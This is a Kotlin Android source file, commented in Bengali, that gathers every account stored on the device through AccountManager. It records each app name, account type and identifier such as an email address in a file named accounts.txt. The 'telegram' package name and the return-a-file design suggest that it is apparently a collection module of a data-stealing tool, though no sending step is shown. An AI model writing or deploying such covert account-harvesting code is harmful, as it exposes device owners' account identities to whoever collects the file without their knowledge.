package com.kashem.shaikh.telegram

import android.accounts.AccountManager
import android.content.Context
import android.content.pm.PackageManager
import com.kashem.shaikh.AppLogs
import java.io.File
import java.io.FileOutputStream
import java.text.SimpleDateFormat
import java.util.*

object Accounts {

    /**
     * ডিভাইসে সংরক্ষিত সব অ্যাকাউন্ট (AccountManager থেকে) সংগ্রহ করে
     * একটি টেক্সট ফাইল হিসাবে রিটার্ন করে।
     * অ্যাকাউন্ট টাইপের প্যাকেজ নাম থেকে অ্যাপের নাম বের করে দেখায়।
     * @return File অথবা null (যদি কোনো অ্যাকাউন্ট না থাকে বা ত্রুটি ঘটে)
     */
    fun collectAccounts(context: Context): File? {
        return try {
            val accountManager = AccountManager.get(context)
            val accounts = accountManager.accounts

            if (accounts.isEmpty()) {
                AppLogs.warn("Accounts: কোনো অ্যাকাউন্ট পাওয়া যায়নি")
                return null
            }

            val sb = StringBuilder()
            sb.appendLine("***** ACCOUNTS *****\n")
            val dateFormat = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
            sb.appendLine("Generated: ${dateFormat.format(Date())}\n")
            sb.appendLine("Total accounts: ${accounts.size}\n")

            val packageManager = context.packageManager

            accounts.forEachIndexed { index, account ->
                val accountType = account.type
                val accountName = account.name

                // অ্যাকাউন্ট টাইপ থেকে অ্যাপের নাম বের করা (নিরাপদ)
                val appName = try {
                    if (accountType.contains('.')) {
                        // getApplicationInfo সরাসরি ApplicationInfo দেয় (নন-নাল)
                        val appInfo = packageManager.getApplicationInfo(accountType, 0)
                        packageManager.getApplicationLabel(appInfo).toString()
                    } else {
                        accountType // টাইপ যদি প্যাকেজ নাম না হয়, টাইপ দেখাও
                    }
                } catch (e: PackageManager.NameNotFoundException) {
                    // প্যাকেজ না থাকলে টাইপ দেখাও
                    accountType
                } catch (e: Exception) {
                    accountType
                }

                sb.appendLine("${index + 1}. App: $appName")
                sb.appendLine("   Type: $accountType")
                sb.appendLine("   Identifier: ${if (accountName.isNullOrBlank()) "No identifier" else accountName}")
                sb.appendLine("   ---")
            }

            val file = File(context.cacheDir, "accounts.txt")
            FileOutputStream(file).use {
                it.write(sb.toString().toByteArray())
            }
            AppLogs.info("Accounts: ${accounts.size} টি অ্যাকাউন্ট সংগৃহীত, ফাইল: ${file.absolutePath}")
            file
        } catch (e: Exception) {
            AppLogs.error("Accounts: অ্যাকাউন্ট সংগ্রহ করতে ব্যর্থ: ${e.message}", e)
            null
        }
    }
}